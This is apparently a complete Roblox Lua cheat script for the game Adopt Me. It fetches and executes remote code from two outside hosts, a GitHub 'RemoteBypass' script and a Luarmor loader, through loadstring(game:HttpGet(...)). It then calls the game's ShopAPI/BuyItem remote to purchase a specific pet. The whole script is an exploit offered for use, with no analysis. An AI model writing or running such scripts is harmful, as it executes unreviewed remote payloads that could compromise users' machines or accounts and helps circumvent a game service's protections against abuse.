wait(0.1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
wait(0.1)
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/08615e5f6a25239a4ffa9b6203728d70.lua"))()
wait(5)
local args = {
    [1] = "pets",
    [2] = "valentines_2025_love_bird",
    [3] = {}
}


game:GetService("ReplicatedStorage").API:FindFirstChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))

